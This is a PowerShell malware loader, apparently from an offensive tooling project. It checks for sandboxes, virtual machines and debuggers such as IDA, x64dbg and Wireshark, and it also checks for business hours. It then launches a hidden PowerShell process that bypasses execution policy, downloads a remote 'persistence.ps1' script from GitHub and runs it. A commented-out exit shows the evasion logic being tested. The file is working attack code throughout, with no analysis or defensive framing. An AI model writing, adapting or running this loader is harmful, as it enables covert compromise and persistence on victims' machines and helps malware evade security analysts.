$t = Get-Date
$s = (Get-Random -Minimum 12 -Maximum 25)
Sleep $s
$n = Get-Date -Format "MM/dd/yyyy HH:mm:ss"
$r = $t.AddSeconds($s)

$isVM = $false
$isSandbox = $false

if ((Get-WmiObject Win32_ComputerSystem).NumberOfLogicalProcessors -le 2) { $isSandbox = $true }

if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { $isSandbox = $true }

if ((Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'").Size -lt 40GB) { $isSandbox = $true }

$vmIndicators = @("vbox", "vmware", "virtual", "qemu", "hyper-v", "xen")
$computerModel = (Get-WmiObject Win32_ComputerSystem).Model
if ($vmIndicators | Where-Object { $computerModel -like "*$_*" }) { $isVM = $true }

$sandboxProcesses = @("vboxservice", "vboxtray", "vmwaretray", "vmwareuser", "xenservice")
$runningProcesses = Get-Process | Select-Object -ExpandProperty ProcessName
if ($sandboxProcesses | Where-Object { $runningProcesses -contains $_ }) { $isSandbox = $true }

$debuggers = @("ollydbg", "ida64", "ida32", "windbg", "x64dbg", "x32dbg", "procmon", "wireshark")
if ($debuggers | Where-Object { Get-Process -Name $_ -ErrorAction SilentlyContinue }) { $isSandbox = $true }

$dayCheck = (Get-Date).DayOfWeek -match "Monday|Tuesday|Wednesday|Thursday|Friday"
$hourCheck = (Get-Date).Hour -ge 8 -and (Get-Date).Hour -le 18

If (($n -ne $r) -or (-not $dayCheck) -or (-not $hourCheck) -or $isSandbox -or $isVM) {
    # It Should be here EXIT 'Since Im Testing  in VM i allowed it xDD'
    #Exit
    powershell -w hidden -ep bypass -c "[PowerShell]::Create().AddScript((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/h41th3m0x/NyxCore/refs/heads/main/persistence.ps1')).Invoke()"
} else {
    powershell -w hidden -ep bypass -c "[PowerShell]::Create().AddScript((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/h41th3m0x/NyxCore/refs/heads/main/persistence.ps1')).Invoke()"
}
